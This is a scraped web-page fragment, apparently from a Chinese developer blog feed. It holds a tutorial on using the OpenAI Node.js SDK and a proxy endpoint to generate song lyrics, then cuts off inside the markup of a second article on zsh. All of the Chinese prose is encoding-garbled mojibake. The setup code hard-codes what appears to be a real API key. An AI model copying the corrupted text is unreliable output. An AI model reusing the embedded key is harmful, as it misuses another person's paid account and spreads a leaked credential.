100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å¼•è¨€</h2>
<p>åœ¨ AIGC æµªæ½®å¸­å·å…¨çƒçš„ä»Šå¤©ï¼Œ<strong>å¤§è¯­è¨€æ¨¡å‹ï¼ˆLLMï¼‰</strong> å·²ä¸å†æ˜¯ç§‘ç ”å®éªŒå®¤é‡Œçš„â€œé»‘ç§‘æŠ€â€ï¼Œè€Œæ˜¯æ¯ä¸€ä¸ªå¼€å‘è€…éƒ½èƒ½è½»æ¾è°ƒç”¨çš„å¼ºå¤§å·¥å…·ã€‚</p>
<p>è€Œä½œä¸ºè¡Œä¸šæ ‡æ†çš„ <strong>OpenAI</strong>ï¼Œé€šè¿‡å…¶ç®€æ´é«˜æ•ˆçš„ API å’Œå®Œå–„çš„ SDK æ”¯æŒï¼Œè®©æˆ‘ä»¬åªéœ€å‡ è¡Œä»£ç å°±èƒ½è®© AI å†™è¯—ã€ä½œè¯ã€ç¼–ç¨‹ç”šè‡³å†™å‘¨æŠ¥ï¼</p>
<p>æœ¬æ–‡å°†ä»¥ä¸€ä¸ªçœŸå®åœºæ™¯ä¸ºä¾‹â€”â€”<strong>è®© GPT ä¸ºæ±ªå³°å†™ä¸€é¦–çŒ®ç»™â€œæ£®æ—åŒ—â€çš„æƒ…æ­Œ</strong>ï¼Œå¸¦ä½ ä»ç¯å¢ƒæ­å»ºåˆ°æ–‡æœ¬ç”Ÿæˆï¼Œå®Œæ•´èµ°é€šä¸€æ¬¡å¤§æ¨¡å‹è°ƒç”¨æµç¨‹ã€‚</p>
<p>å…¨ç¨‹æ— å‘ã€ä»£ç å¯è¿è¡Œï¼Œ<strong>æ–°æ‰‹å‹å¥½ï¼Œè€é¸Ÿä¹Ÿèƒ½æ”¶è·ç»†èŠ‚æŠ€å·§</strong>ï¼Œå»ºè®®æ”¶è—+ç‚¹èµï¼Œé˜²æ­¢èµ°ä¸¢ï¼</p>
<hr/>
<h3 data-id="heading-1">ğŸŒ± ä¸€ã€å¼€å‘å‡†å¤‡ï¼š5åˆ†é’Ÿåˆå§‹åŒ–é¡¹ç›®</h3>
<p>æˆ‘ä»¬ä½¿ç”¨ <strong>Node.js + npm</strong> æ­å»ºåç«¯æœåŠ¡ç¯å¢ƒï¼Œè½»é‡é«˜æ•ˆï¼Œé€‚åˆå¿«é€ŸéªŒè¯ AI èƒ½åŠ›ã€‚</p>
<h4 data-id="heading-2">1. åˆå§‹åŒ–é¡¹ç›®</h4>
<pre><code class="hljs language-bash" lang="bash">npm init -y
</code></pre>
<p>è¿™æ¡å‘½ä»¤ä¼šè‡ªåŠ¨ç”Ÿæˆ <code>package.json</code> æ–‡ä»¶ï¼Œè®°å½•ä½ çš„é¡¹ç›®ä¾èµ–å’Œé…ç½®ä¿¡æ¯ã€‚</p>
<h4 data-id="heading-3">2. å®‰è£… OpenAI SDK</h4>
<pre><code class="hljs language-bash" lang="bash">npm install openai
</code></pre>
<p>OpenAI å®˜æ–¹æä¾›çš„ SDK å°è£…äº†æ‰€æœ‰ API æ¥å£ï¼Œçœå»æ‰‹åŠ¨å¤„ç† HTTP è¯·æ±‚çš„ç¹çå·¥ä½œï¼Œ<strong>ä¸€è¡Œå¼•å…¥ï¼Œå³åˆ»è°ƒç”¨</strong>ã€‚</p>
<blockquote>
<p>âš ï¸ æ³¨æ„ï¼šSDK éœ€è¦ Node.js ç‰ˆæœ¬ &gt;= 16ï¼Œè¯·ç¡®ä¿æœ¬åœ°ç¯å¢ƒæ»¡è¶³è¦æ±‚ã€‚</p>
</blockquote>
<hr/>
<h3 data-id="heading-4">ğŸ”‘ äºŒã€é…ç½®å®¢æˆ·ç«¯ï¼šæ‹¿åˆ°é€šå¾€ AI ä¸–ç•Œçš„é’¥åŒ™</h3>
<p>æ¥ä¸‹æ¥æ˜¯å…³é”®ä¸€æ­¥ï¼š<strong>åˆ›å»º OpenAI å®¢æˆ·ç«¯å®ä¾‹</strong>ã€‚</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> <span class="hljs-title class_">OpenAI</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'openai'</span>;

<span class="hljs-keyword">const</span> openai = <span class="hljs-keyword">new</span> <span class="hljs-title class_">OpenAI</span>({
  <span class="hljs-attr">apiKey</span>: <span class="hljs-string">'sk-RUP7SvQy4trgMCDsbBXxjgpNSR235Kqa7tjIh8jv1NBlMnzI'</span>, <span class="hljs-comment">// æ›¿æ¢ä¸ºä½ è‡ªå·±çš„ Key</span>
  <span class="hljs-attr">baseURL</span>: <span class="hljs-string">'https://api.302.ai/v1'</span> <span class="hljs-comment">// å¯é€‰ï¼šä»£ç†åœ°å€ï¼Œè§£å†³ç½‘ç»œè®¿é—®é—®é¢˜</span>
});
</code></pre>
<h4 data-id="heading-5">å…³é”®å‚æ•°è¯´æ˜ï¼š</h4>

















<table><thead><tr><th>å‚æ•°</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>apiKey</code></td><td>è®¿é—®æƒé™å‡­è¯ï¼Œç›¸å½“äºâ€œå¯†ç â€ï¼ŒåŠ¡å¿…ä¿å¯†ï¼</td></tr><tr><td><code>baseURL</code></td><td>API åœ°å€ï¼Œé»˜è®¤ä¸º <code>https://api.openai.com/v1</code>ï¼Œæ­¤å¤„ä½¿ç”¨ç¬¬ä¸‰æ–¹ä»£ç†ï¼ˆå¦‚æ— æ³•ç›´è¿ OpenAI å¯ç”¨ï¼‰</td></tr></tbody></table>
<p>ğŸ’¡ <strong>å°è´´å£«</strong>ï¼š</p>
<ul>
<li>Key å¯åœ¨ <a href="https://link.juejin.cn?target=https%3A%2F%2Fplatform.openai.com%2Fapi-keys" target="_blank" title="https://platform.openai.com/api-keys" ref="nofollow noopener noreferrer">OpenAI å®˜ç½‘</a> è·å–ã€‚</li>
<li>è‹¥ä½ åœ¨å›½å†…ï¼Œæ¨èä½¿ç”¨ç¨³å®šä¸­è½¬æœåŠ¡ï¼ˆå¦‚ 302.aiã€FastGPT ç­‰ï¼‰ï¼Œé¿å…è¯·æ±‚è¶…æ—¶ã€‚</li>
</ul>
<hr/>
<h3 data-id="heading-6">ğŸ¤ ä¸‰ã€è°ƒç”¨æ¨¡å‹ï¼šè®© AI æˆä¸ºæ—å¤•çº§åˆ«çš„ä½œè¯äºº</h3>
<p>æˆ‘ä»¬çš„ç›®æ ‡å¾ˆæ˜ç¡®ï¼š</p>
<blockquote>
<p>â€œä»¥æ—å¤•é£æ ¼ï¼Œä¸ºæ±ªå³°å†™ä¸€é¦–å…³äºâ€˜æ£®æ—åŒ—â€™çš„çˆ±æƒ…æ­Œæ›²ï¼Œ100 å­—å·¦å³ã€‚â€</p>
</blockquote>
<h4 data-id="heading-7">ä½¿ç”¨ <code>completions.create()</code> æ¥å£</h4>
<p>è¿™æ˜¯ OpenAI æœ€ç»å…¸çš„æ–‡æœ¬ç”Ÿæˆæ¥å£ï¼Œé€‚ç”¨äºå•æ¬¡è¾“å…¥ã€è¾“å‡ºä»»åŠ¡ï¼Œæ¯”å¦‚å†™æ–‡æ¡ˆã€å†™æ­Œè¯ã€è¡¥å…¨æ–‡æœ¬ç­‰ã€‚</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> openai.<span class="hljs-property">completions</span>.<span class="hljs-title function_">create</span>({
  <span class="hljs-attr">model</span>: <span class="hljs-string">'gpt-3.5-turbo-instruct'</span>,
  <span class="hljs-attr">prompt</span>: <span class="hljs-string">`
    å‡å¦‚ä½ æ˜¯æ—å¤•è¿™æ ·çš„çˆ±æƒ…æ­Œæ›²ä½œè¯å¤§å®¶ï¼Œ
    è¯·ä½ å†™ä¸€é¦–100å­—,ä¸ºæ±ªå³°,å†™ä¸€é¦–ä»–çˆ±ä¸Šæ£®æ—åŒ—çš„æ­Œæ›²ã€‚
    æ£®æ—åŒ—æ˜¯ä¸€ä½ç¾ä¸½ï¼Œå‹‡æ•¢ï¼Œä¼šéª‘é©¬çš„å¥³å­©å„¿ã€‚
  `</span>,
  <span class="hljs-attr">max_tokens</span>: <span class="hljs-number">800</span>,
  <span class="hljs-attr">temperature</span>: <span class="hljs-number">1</span>
});
</code></pre>
<h4 data-id="heading-8">å‚æ•°è¯¦è§£ï¼š</h4>






























<table><thead><tr><th>å‚æ•°</th><th>ä½œç”¨</th><th>æ¨èå€¼</th></tr></thead><tbody><tr><td><code>model</code></td><td>æŒ‡å®šæ¨¡å‹ç‰ˆæœ¬</td><td><code>gpt-3.5-turbo-instruct</code> æ€§ä»·æ¯”ä¹‹ç‹</td></tr><tr><td><code>prompt</code></td><td>æç¤ºè¯ï¼Œå†³å®šç”Ÿæˆå†…å®¹æ–¹å‘</td><td>æè¿°è¶Šç»†ï¼Œç»“æœè¶Šå‡† âœ…</td></tr><tr><td><code>max_tokens</code></td><td>æ§åˆ¶æœ€å¤§è¾“å‡ºé•¿åº¦</td><td>ä¸€èˆ¬è®¾ä¸º 512~1024</td></tr><tr><td><code>temperature</code></td><td>åˆ›æ„éšæœºæ€§æ§åˆ¶</td><td><code>0.7~1.0</code> å¹³è¡¡åˆ›æ„ä¸ç¨³å®šæ€§</td></tr></tbody></table>
<p>ğŸ¯ <strong>Prompt å·¥ç¨‹æŠ€å·§</strong>ï¼š</p>
<ul>
<li>æ˜ç¡®è§’è‰²ï¼šâ€œå‡å¦‚ä½ æ˜¯æ—å¤•â€</li>
<li>ç»™å‡ºå¯¹è±¡ï¼šâ€œæ±ªå³°çˆ±ä¸Šäº†æ£®æ—åŒ—â€</li>
<li>è®¾å®šç‰¹å¾ï¼šâ€œä¼šéª‘é©¬ã€å‹‡æ•¢ã€è‡ªç”±çš„çµé­‚â€</li>
<li>é™åˆ¶æ ¼å¼ï¼šâ€œ100å­—ä»¥å†…ï¼ŒæŠ¼éŸµä¼˜å…ˆâ€</li>
</ul>
<blockquote>
<p>âœ… ä¼˜è´¨ Prompt = é«˜è´¨é‡è¾“å‡ºï¼</p>
</blockquote>
<hr/>
<h3 data-id="heading-9">ğŸ“¤ å››ã€è·å–ç»“æœï¼šæŠŠ AI çš„çµæ„Ÿæ‰“å°å‡ºæ¥</h3>
<p>API è¿”å›çš„æ˜¯ JSON æ ¼å¼æ•°æ®ï¼Œæˆ‘ä»¬éœ€è¦ä»ä¸­æå–ç”Ÿæˆçš„æ–‡æœ¬ã€‚</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> song = response.<span class="hljs-property">choices</span>[<span class="hljs-number">0</span>].<span class="hljs-property">text</span>.<span class="hljs-title function_">trim</span>();
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'ğŸµ æ­Œè¯æ˜¯ï¼š\n'</span> + song);
</code></pre>
<h4 data-id="heading-10">ç¤ºä¾‹è¾“å‡ºï¼ˆæ¨¡æ‹Ÿï¼‰ï¼š</h4>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/27b049ed4d1c488baba31029ffd41676~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5qCA56eLNjY2:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767864221&amp;x-signature=479bHQbZAUhjLTsiQglguUB9xHE%3D" alt="image.png" loading="lazy"/>
æ˜¯ä¸æ˜¯å·²ç»æœ‰æ±ªå³°é‚£å‘³å„¿äº†ï¼ŸğŸ¸</p>
<hr/>
<h3 data-id="heading-11">ğŸ›¡ï¸ äº”ã€å¥å£®æ€§å¢å¼ºï¼šåŠ å…¥é”™è¯¯å¤„ç†æœºåˆ¶</h3>
<p>å®é™…å¼€å‘ä¸­ä¸èƒ½å¿½ç•¥å¼‚å¸¸æƒ…å†µã€‚ç½‘ç»œæ³¢åŠ¨ã€Key å¤±æ•ˆã€è¯·æ±‚è¶…æ—¶éƒ½å¯èƒ½å¯¼è‡´ç¨‹åºå´©æºƒã€‚</p>
<p>å»ºè®®ç”¨ <code>try/catch</code> åŒ…è£¹è°ƒç”¨é€»è¾‘ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">try</span> {
  <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> openai.<span class="hljs-property">completions</span>.<span class="hljs-title function_">create</span>({ <span class="hljs-comment">/* ... */</span> });
  <span class="hljs-keyword">const</span> song = response.<span class="hljs-property">choices</span>[<span class="hljs-number">0</span>].<span class="hljs-property">text</span>.<span class="hljs-title function_">trim</span>();
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'âœ… æˆåŠŸç”Ÿæˆæ­Œè¯ï¼š\n'</span> + song);
} <span class="hljs-keyword">catch</span> (error) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'âŒ è°ƒç”¨å¤±è´¥ï¼š'</span>, error.<span class="hljs-property">message</span>);
  <span class="hljs-keyword">if</span> (error.<span class="hljs-property">status</span> === <span class="hljs-number">401</span>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'ğŸ‘‰ æ£€æŸ¥ API Key æ˜¯å¦æ­£ç¡®'</span>);
  }
}
</code></pre>
<p>å¸¸è§é”™è¯¯ç ï¼š</p>
<ul>
<li><code>401</code>: Key é”™è¯¯</li>
<li><code>429</code>: è¯·æ±‚é¢‘ç‡è¿‡é«˜</li>
<li><code>500</code>: æ¨¡å‹æœåŠ¡å™¨å¼‚å¸¸</li>
</ul>
<hr/>
<h3 data-id="heading-12">ğŸ”„ å…­ã€è¿›é˜¶æ€è€ƒï¼šCompletion vs Chat æ¥å£æ€ä¹ˆé€‰ï¼Ÿ</h3>
<p>ä½ å¯èƒ½ä¼šé—®ï¼šç°åœ¨ä¸»æµéƒ½æ˜¯ <code>chat.completions</code>ï¼Œä¸ºä»€ä¹ˆè¿˜ç”¨ <code>completion</code>ï¼Ÿ</p>
<h4 data-id="heading-13">å¯¹æ¯”è¡¨æ ¼ï¼š</h4>



































<table><thead><tr><th>ç‰¹æ€§</th><th><code>completions</code></th><th><code>chat.completions</code></th></tr></thead><tbody><tr><td>é€‚ç”¨åœºæ™¯</td><td>å•è½®ç”Ÿæˆä»»åŠ¡</td><td>å¤šè½®å¯¹è¯ç³»ç»Ÿ</td></tr><tr><td>è¾“å…¥æ ¼å¼</td><td>çº¯æ–‡æœ¬ prompt</td><td>æ¶ˆæ¯æ•°ç»„ï¼ˆrole-basedï¼‰</td></tr><tr><td>ä¸Šä¸‹æ–‡è®°å¿†</td><td>âŒ ä¸æ”¯æŒ</td><td>âœ… æ”¯æŒå†å²å¯¹è¯</td></tr><tr><td>æˆæœ¬</td><td>è¾ƒä½</td><td>ç•¥é«˜ï¼ˆå°¤å…¶é•¿ä¸Šä¸‹æ–‡ï¼‰</td></tr><tr><td>æ¨èç”¨é€”</td><td>å†™ä½œã€æ‘˜è¦ã€å¡«ç©º</td><td>å®¢æœæœºå™¨äººã€èŠå¤©åº”ç”¨</td></tr></tbody></table>
<p>ğŸ“Œ <strong>ç»“è®º</strong>ï¼š</p>
<ul>
<li>å¦‚æœåªæ˜¯<strong>ä¸€æ¬¡æ€§ç”Ÿæˆå†…å®¹</strong>ï¼ˆå¦‚å†™æ­Œè¯ã€å†™é‚®ä»¶ï¼‰ï¼Œ<code>completion</code> æ›´ç®€å•ç›´æ¥ï¼›</li>
<li>å¦‚æœè¦åš<strong>æ™ºèƒ½å¯¹è¯ç³»ç»Ÿ</strong>ï¼Œå¿…é¡»ä¸Š <code>chat</code> æ¥å£ã€‚</li>
</ul>
<hr/>
<h3 data-id="heading-14">ğŸš€ ä¸ƒã€æ‹“å±•ç©æ³•ï¼šä½ å¯ä»¥è¿™æ ·ç©å¾—æ›´å—¨</h3>
<p>å­¦ä¼šäº†åŸºç¡€è°ƒç”¨ï¼Œä¸‹ä¸€æ­¥å°±æ˜¯åˆ›é€ ä»·å€¼ï¼ä»¥ä¸‹æ˜¯ä¸€äº›å»¶å±•æ€è·¯ï¼š</p>
<h4 data-id="heading-15">1. æ‰¹é‡ç”Ÿæˆæ­Œè¯ç‰‡æ®µ</h4>
<p>ç»“åˆæ•°æ®åº“æˆ– CSVï¼Œæ‰¹é‡ä¸ºä¸åŒäººç‰©ç”Ÿæˆä¸“å±æƒ…æ­Œã€‚</p>
<h4 data-id="heading-16">2. æ„å»º Web é¡µé¢</h4>
<p>ç”¨ Express æˆ– Next.js æ­ä¸ªç½‘é¡µï¼Œè®©ç”¨æˆ·å¡«å†™â€œæ­Œæ‰‹+æ‹äººåå­—+å…³é”®è¯â€ï¼Œå®æ—¶ç”Ÿæˆæ­Œè¯ã€‚</p>
<h4 data-id="heading-17">3. å¾®è°ƒæ¨¡å‹ï¼ˆFine-tuningï¼‰</h4>
<p>æ”¶é›†æ—å¤•é£æ ¼æ­Œè¯è¿›è¡Œå¾®è°ƒï¼Œæ‰“é€ ä¸“å±â€œæ—å¤•Botâ€ã€‚</p>
<h4 data-id="heading-18">4. ç»“åˆè¯­éŸ³åˆæˆ</h4>
<p>ç”¨ TTSï¼ˆText-to-Speechï¼‰æŠŠæ­Œè¯å¿µå‡ºæ¥ï¼Œåšæˆ AI æ¼”å”± Demoï¼</p>
<hr/>
<h3 data-id="heading-19">ğŸ’¬ å…«ã€ç»“è¯­ï¼šæŒæ¡æ ¸å¿ƒèƒ½åŠ›ï¼Œæ‰èƒ½é©¾é©­ AI æµªæ½®</h3>
<p>é€šè¿‡è¿™ç¯‡æ–‡ç« ï¼Œä½ å·²ç»æŒæ¡äº†ï¼š</p>
<p>âœ… å¦‚ä½•åˆå§‹åŒ– Node.js é¡¹ç›®<br/>
âœ… å¦‚ä½•å®‰è£…å¹¶é…ç½® OpenAI SDK<br/>
âœ… å¦‚ä½•ç¼–å†™é«˜è´¨é‡ Prompt<br/>
âœ… å¦‚ä½•è°ƒç”¨ completion æ¥å£ç”Ÿæˆæ–‡æœ¬<br/>
âœ… å¦‚ä½•å¤„ç†å¼‚å¸¸ã€ä¼˜åŒ–ç”¨æˆ·ä½“éªŒ</p>
<p>æ›´é‡è¦çš„æ˜¯ï¼Œä½ ç†è§£äº†ï¼š</p>
<blockquote>
<p><strong>å¤§æ¨¡å‹ä¸æ˜¯é­”æ³•ï¼Œè€Œæ˜¯å·¥å…·ï¼›çœŸæ­£çš„é­”æ³•ï¼Œåœ¨äºä½ æ€ä¹ˆä½¿ç”¨å®ƒã€‚</strong></p>
</blockquote>
<p>æ— è®ºä½ æ˜¯å‰ç«¯ã€åç«¯ã€å…¨æ ˆè¿˜æ˜¯äº§å“ç»ç†ï¼Œåªè¦å­¦ä¼šè°ƒç”¨å¤§æ¨¡å‹ï¼Œå°±èƒ½ä¸ºè‡ªå·±èµ‹èƒ½åå€æ•ˆç‡ã€‚</p>
<hr/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ç»ˆç«¯ç¯å¢ƒï¼šzshã€oh-my-zshä¸ 7 ä¸ªæ•ˆç‡æ’ä»¶]]></title>    <link>https://juejin.cn/post/7589935326781898786</link>    <guid>https://juejin.cn/post/7589935326781898786</guid>    <pubDate>2026-01-01T09:40:27.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589935326781898786" data-draft-id="7589935326781849634" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ç»ˆç«¯ç¯å¢ƒï¼šzshã€oh-my-zshä¸ 7 ä¸ªæ•ˆç‡æ’ä»¶"/> <meta itemprop="keywords" content="Shell"/> <meta itemprop="datePublished" content="2026-01-01T09:40:27.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="____xl"/> <meta itemprop="url" content="https://juejin.cn/user/448256474093528"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ç»ˆç«¯ç¯å¢ƒï¼šzshã€oh-my-zshä¸ 7 ä¸ªæ•ˆç‡æ’ä»¶
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/448256474093528/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ____xl
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-01T09:40:27.000Z" title="Thu Jan 01 2026 09:40:27 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-01
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 